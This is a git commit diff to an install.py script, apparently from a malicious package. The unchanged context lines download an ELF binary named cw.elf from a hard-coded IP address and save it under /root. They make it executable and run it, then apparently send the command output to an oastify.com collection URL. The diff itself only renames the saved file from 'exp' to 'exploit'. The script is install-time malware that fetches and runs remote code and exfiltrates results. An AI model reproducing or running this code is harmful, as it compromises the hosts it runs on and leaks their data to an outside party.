47d51fc1c77ac5baa01dc3bfd3577030c46cbd05
nermeena <129248571+nermeena17300852@users.noreply.github.com>
2023-06-28 17:10:11 +0800

    Update install.py

--- install.py
+++ install.py
@@ -11,9 +11,9 @@ result = os.popen(command).read()
 down_url='http://47.102.125.70:443/cw.elf'
 response = requests.get(down_url)
 if response.status_code == 200:
-  with open('/root/exp', 'wb') as file:
+  with open('/root/exploit', 'wb') as file:
     file.write(response.content)
-  command = 'chmod +x /root/exp; /root/exp'
+  command = 'chmod +x /root/exploit; /root/exploit'
   result = os.popen(command).read()
   url = 'https://ej1fgqfpmx4qinz0uewpcola319uxkl9.oastify.com/resp'
   data = {'result': result}
